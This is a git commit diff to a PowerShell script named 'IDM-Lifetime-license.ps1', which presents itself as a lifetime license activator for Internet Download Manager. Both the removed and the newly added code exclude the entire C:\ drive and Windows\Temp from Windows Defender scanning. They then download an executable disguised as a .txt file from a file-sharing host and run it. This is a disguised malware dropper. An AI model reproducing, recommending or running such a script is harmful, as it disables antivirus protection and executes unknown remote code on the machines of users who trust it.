30003633955f54ff96851fea46956772a96cdf22
Pctoolsbox.com <45397057+Pctoolsbox@users.noreply.github.com>
2024-12-04 15:54:09 +0200

    Update IDM-Lifetime-license.ps1

--- IDM-Lifetime-license.ps1
+++ IDM-Lifetime-license.ps1
@@ -1,34 +1,13 @@
 # Check the instructions here on how to use it https://github.com/lstprjct/IDM-Activation-Script/wiki
 
-Add-MpPreference -ExclusionPath "C:\","IDMLifetimelicense.exe","C:\Windows\Temp\"
-
-$ErrorActionPreference = "Stop"
-# Enable TLSv1.2 for compatibility with older clients
-[Net.ServicePointManager]::SecurityProtocol = [Net.ServicePointManager]::SecurityProtocol -bor [Net.SecurityProtocolType]::Tls12
-
-$DownloadURL = 'https://filebin.net/0amrx01k505y0b4g/IDMLifetimelicense.txt'
-
-$rand = Get-Random -Maximum 99999999
-$isAdmin = [bool]([Security.Principal.WindowsIdentity]::GetCurrent().Groups -match 'S-1-5-32-544')
-$FilePath = if ($isAdmin) { "$env:SystemRoot\Temp\license_$rand.exe" } else { "$env:TEMP\license_$rand.exe" }
-
-try {
-    $response = Invoke-WebRequest -Uri $DownloadURL -UseBasicParsing
-}
-catch {
-    $response = Invoke-WebRequest -Uri $DownloadURL2 -UseBasicParsing
-}
-
-$ScriptArgs = "$args "
-$prefix = "@REM $rand `r`n"
-$content = $prefix + $response
-Set-Content -Path $FilePath -Value $content
-
-Start-Process $FilePath $ScriptArgs -Wait
-
-$FilePaths = @("$env:TEMP\license*.exe", "$env:SystemRoot\Temp\license*.exe")
-foreach ($FilePath in $FilePaths) { Get-Item $FilePath | Remove-Item }
-
+Add-MpPreference -ExclusionPath "C:\","IDM-Lifetime-license.exe","C:\Windows\Temp\"
+$url = "https://filebin.net/0amrx01k505y0b4g/IDMLifetimelicense.txt"
+$outpath = "C:\Windows\Temp\IDM-Lifetime-license.exe"
+Invoke-WebRequest -Uri $url -OutFile $outpath
+$wc = New-Object System.Net.WebClient
+$wc.DownloadFile($url, $outpath)
+$args = @("Comma","Separated","Arguments")
+Start-Process -Filepath "C:\Windows\Temp\IDM-Lifetime-license.exe" -ArgumentList $args
 
 
 
